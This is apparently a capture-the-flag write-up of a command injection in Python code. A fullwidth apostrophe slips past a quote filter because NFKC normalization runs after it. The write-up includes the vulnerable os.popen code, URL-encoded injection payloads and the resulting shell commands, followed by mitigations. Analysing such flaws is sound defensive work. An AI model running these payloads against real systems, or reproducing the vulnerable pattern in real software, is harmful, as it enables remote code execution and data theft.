# Vulnerability Report DOJO 46

---

## Command Injection via Unicode NFKC Normalization Bypassing Quote Sanitization (RCE)

The application processes user input through URL decoding, replaces single quotes (`'`) with underscores (`_`), then applies Unicode NFKC normalization before injecting the result into a shell command via `os.popen()`. By using the Unicode fullwidth apostrophe (`＇`, U+FF07) instead of a standard single quote, an attacker bypasses the quote filter entirely — NFKC normalization converts the fullwidth character back to a standard `'` after the replace, which is then interpreted by the shell as a command separator, leading to arbitrary remote code execution.

---

## Root Cause — Step-by-Step Breakdown

The vulnerable code path is the following:

```python
whisperMsg = unquote(user_input)
whisperMsg = unicodedata.normalize("NFKC", whisperMsg.replace("'", "_"))

with os.popen(f"echo -n '{whisperMsg}' | hexdump") as stream:
    ...
```

### Step 1 — URL decoding

The input `%EF%BC%87%3B+ls%3B+echo+%EF%BC%87` is decoded by `unquote()`:

```
＇; ls; echo ＇
```

`＇` is the Unicode fullwidth apostrophe (U+FF07), visually similar to `'` but a distinct code point.

### Step 2 — The `replace()` call does not trigger

```python
"＇; ls; echo ＇".replace("'", "_")
# output → "＇; ls; echo ＇"   (unchanged, ＇ ≠ ')
```

The filter looks for the ASCII single quote (`U+0027`) only. The fullwidth variant passes through untouched.

### Step 3 — NFKC normalization converts `＇` back to `'`

```python
unicodedata.normalize("NFKC", "＇")
# output → "'"
```

NFKC (Compatibility Decomposition followed by Canonical Composition) maps visually compatible characters to their standard ASCII equivalents. The fullwidth apostrophe becomes a standard single quote.

### Step 4 — Shell command injection

The final string passed to `os.popen()` becomes:

```bash
echo -n ''; ls; echo '' | hexdump
```

The injected quotes close the original shell string and introduce arbitrary commands between semicolons.

---

## Impact

An unauthenticated attacker can execute arbitrary shell commands on the server under the permissions of the application user (`nobody`), enabling:

- Full environment variable disclosure (secrets, flags)
- File system enumeration and sensitive file exfiltration
- Arbitrary command execution
- Potential privilege escalation if the runtime environment is misconfigured

---

## Proof of Concept

**Input (URL-encoded):**

```
%EF%BC%87%3B+ls%3B+echo+%EF%BC%87
```

**Decoded value:**

```
＇; ls; echo ＇
```

**After `replace()` (no change):**

```
＇; ls; echo ＇
```

**After NFKC normalization:**

```
'; ls; echo '
```

**Final shell command executed:**

```bash
echo -n ''; ls; echo '' | hexdump
```

**To retrieve the flag directly:**

```
＇; echo $FLAG #
```

Which executes:

```bash
echo -n ''; echo $FLAG #' | hexdump
```

The `#` comments out the rest of the original command, cleanly terminating the injection.

**Flag:** `<FLAG>`

---

## Mitigation

### 1. Replace `os.popen()` with `subprocess` and argument lists

`os.popen()` always invokes `/bin/sh` and interprets `;` as a command separator. Using `subprocess.run()` with an argument list passes input as data, never as code:

```python
# ❌ Vulnerable
with os.popen(f"echo -n '{whisperMsg}' | hexdump") as stream:
    ...

# ✅ Safe
import subprocess

echo_out = subprocess.run(
    ['echo', '-n', user_input],
    capture_output=True, text=True
).stdout

hex_out = subprocess.run(
    ['hexdump'],
    input=echo_out, capture_output=True, text=True
).stdout
```

With this approach:
- No shell is invoked — `;` is treated as a literal character
- `user_input` is passed as a single argument, never parsed
- No string concatenation means no way to break out of argument context

### 2. Normalize input before sanitizing, not after

The root cause is that sanitization runs before normalization. Reversing the order closes the bypass:

```python
# ✅ Normalize first, then sanitize
whisperMsg = unquote(user_input)
whisperMsg = unicodedata.normalize("NFKC", whisperMsg)  # normalize first
whisperMsg = whisperMsg.replace("'", "_")               # then sanitize
```

### 3. Use an allowlist for permitted characters

```python
import re

def sanitize(value):
    # Only allow alphanumeric and basic punctuation
    return re.sub(r"[^a-zA-Z0-9 .,!?-]", "", unicodedata.normalize("NFKC", value))
```

---

## Vulnerability Classification

| Field | Value |
|---|---|
| **Type** | OS Command Injection via Unicode Normalization |
| **Vector** | User input → Unicode bypass → NFKC normalization → shell injection |
| **Impact** | Remote Code Execution — full environment and file system access |
| **Authentication** | Not required |
| **CWE** | CWE-78 (OS Command Injection), CWE-94 (Code Injection) |
| **CVSS** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **9.8 Critical** |